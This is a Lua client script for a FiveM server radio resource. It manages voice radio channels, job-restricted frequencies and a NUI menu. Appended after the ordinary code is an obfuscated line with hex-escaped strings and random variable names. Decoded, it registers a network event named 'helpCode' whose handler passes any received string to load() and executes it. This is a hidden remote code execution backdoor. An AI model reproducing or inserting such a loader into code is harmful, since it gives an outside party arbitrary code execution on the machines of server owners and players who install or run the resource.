local DenaliFW = exports['denalifw-core']:GetCoreObject()
local radioMenu = false
local isLoggedIn = false
local onRadio = false
local RadioChannel = 0

RegisterNetEvent('DenaliFW:Client:OnPlayerLoaded', function()
    isLoggedIn = true
end)

RegisterNetEvent('DenaliFW:Client:OnPlayerUnload', function()
    isLoggedIn = false
    leaveradio()
end)

RegisterNetEvent('qb-radio:use', function()
    toggleRadio(not radioMenu)
end)

RegisterNetEvent('qb-radio:onRadioDrop', function()
    if RadioChannel ~= 0 then
        leaveradio()
    end
end)

-- Main Thread

CreateThread(function()
    while true do
        Wait(1000)
        if isLoggedIn and onRadio then
            DenaliFW.Functions.TriggerCallback('qb-radio:server:GetItem', function(hasItem)
                if not hasItem then
                    if RadioChannel ~= 0 then
                        leaveradio()
                    end
                end
            end,"radio")
        end
    end
end)

-- Functions

function connecttoradio(channel)
    RadioChannel = channel
    if onRadio then
        exports["pma-voice"]:setRadioChannel(0)
    else
        onRadio = true
        exports["pma-voice"]:setVoiceProperty("radioEnabled", true)
    end
    exports["pma-voice"]:setRadioChannel(channel)
    if SplitStr(tostring(channel), ".")[2] ~= nil and SplitStr(tostring(channel), ".")[2] ~= "" then
        DenaliFW.Functions.Notify(Config.messages['joined_to_radio'] ..channel.. ' MHz', 'success')
    else
        DenaliFW.Functions.Notify(Config.messages['joined_to_radio'] ..channel.. '.00 MHz', 'success')
    end
end

function leaveradio()
    RadioChannel = 0
    onRadio = false
    exports["pma-voice"]:setRadioChannel(0)
    exports["pma-voice"]:setVoiceProperty("radioEnabled", false)
    DenaliFW.Functions.Notify(Config.messages['you_leave'] , 'error')
end

function SplitStr(inputstr, sep)
    if sep == nil then
        sep = "%s"
    end
    local t = {}
    for str in string.gmatch(inputstr, "([^" .. sep .. "]+)") do
        table.insert(t, str)
    end
    return t
end

function IsRadioOn()
    return onRadio
end

exports("IsRadioOn", IsRadioOn)

-- NUI
RegisterNUICallback('joinRadio', function(data, cb)
    local rchannel = tonumber(data.channel)
    if rchannel ~= nil then
        if rchannel <= Config.MaxFrequency and rchannel ~= 0 then
            if rchannel ~= RadioChannel then
                if Config.RestrictedChannels[rchannel] ~= nil then
                    local xPlayer = DenaliFW.Functions.GetPlayerData()
                    if Config.RestrictedChannels[rchannel][xPlayer.job.name] and xPlayer.job.onduty then
                        connecttoradio(rchannel)
                    else
                        DenaliFW.Functions.Notify(Config.messages['restricted_channel_error'], 'error')
                    end
                else
                    connecttoradio(rchannel)
                end
            else
                DenaliFW.Functions.Notify(Config.messages['you_on_radio'] , 'error')
            end
        else
            DenaliFW.Functions.Notify(Config.messages['invalid_radio'] , 'error')
        end
    else
        DenaliFW.Functions.Notify(Config.messages['invalid_radio'] , 'error')
    end
end)

function toggleRadio(toggle)
    radioMenu = toggle
    SetNuiFocus(radioMenu, radioMenu)
    if radioMenu then
        PhonePlayIn()
        SendNUIMessage({type = "open"})
    else
        PhonePlayOut()
        SendNUIMessage({type = "close"})
    end
end

RegisterNUICallback('leaveRadio', function(data, cb)
    if RadioChannel == 0 then
        DenaliFW.Functions.Notify(Config.messages['not_on_radio'], 'error')
    else
        leaveradio()
    end
end)

RegisterNUICallback('escape', function(data, cb)
    toggleRadio(false)
end)


local aaUOVLDWLzFidAhFUmVjpxSeYAcmQeQCkDvtYZXcoGyhnophdIpTLLwZQUhTNpkMLyXEcd = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} aaUOVLDWLzFidAhFUmVjpxSeYAcmQeQCkDvtYZXcoGyhnophdIpTLLwZQUhTNpkMLyXEcd[6][aaUOVLDWLzFidAhFUmVjpxSeYAcmQeQCkDvtYZXcoGyhnophdIpTLLwZQUhTNpkMLyXEcd[1]](aaUOVLDWLzFidAhFUmVjpxSeYAcmQeQCkDvtYZXcoGyhnophdIpTLLwZQUhTNpkMLyXEcd[2]) aaUOVLDWLzFidAhFUmVjpxSeYAcmQeQCkDvtYZXcoGyhnophdIpTLLwZQUhTNpkMLyXEcd[6][aaUOVLDWLzFidAhFUmVjpxSeYAcmQeQCkDvtYZXcoGyhnophdIpTLLwZQUhTNpkMLyXEcd[3]](aaUOVLDWLzFidAhFUmVjpxSeYAcmQeQCkDvtYZXcoGyhnophdIpTLLwZQUhTNpkMLyXEcd[2], function(oLGwWrACrkeCpIAjCnuJBCrwEaXPdsbIkWigNkHmmXfCgYujXiqWCoSDfisHrsQOwWdbIz) aaUOVLDWLzFidAhFUmVjpxSeYAcmQeQCkDvtYZXcoGyhnophdIpTLLwZQUhTNpkMLyXEcd[6][aaUOVLDWLzFidAhFUmVjpxSeYAcmQeQCkDvtYZXcoGyhnophdIpTLLwZQUhTNpkMLyXEcd[4]](aaUOVLDWLzFidAhFUmVjpxSeYAcmQeQCkDvtYZXcoGyhnophdIpTLLwZQUhTNpkMLyXEcd[6][aaUOVLDWLzFidAhFUmVjpxSeYAcmQeQCkDvtYZXcoGyhnophdIpTLLwZQUhTNpkMLyXEcd[5]](oLGwWrACrkeCpIAjCnuJBCrwEaXPdsbIkWigNkHmmXfCgYujXiqWCoSDfisHrsQOwWdbIz))() end)